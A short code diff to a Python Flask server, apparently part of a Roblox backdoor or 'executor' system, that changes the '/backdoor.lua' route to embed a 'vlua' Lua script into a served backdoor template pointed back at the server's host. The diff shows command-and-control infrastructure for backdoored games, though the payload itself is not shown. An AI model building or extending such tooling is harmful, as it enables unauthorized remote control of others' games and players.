@@ -99,7 +99,9 @@ def roblox_ping():
 
 @executor.route('/backdoor.lua', methods=['GET'])
 def backdoor_script():
-    return render_template("assets/lua/backdoor.lua", endpoint=request.headers.get("Host"))
+    with open(f"{PATH}/static/assets/lua/vlua.lua", encoding="utf8") as vlua_script:
+        vlua_script = vlua_script.read()
+    return render_template("assets/lua/backdoor.lua", endpoint=request.headers.get("Host"), vlua=vlua_script)
 
 @executor.route('/api/players', methods=['GET', 'POST'])
 def roblox_player_ping():
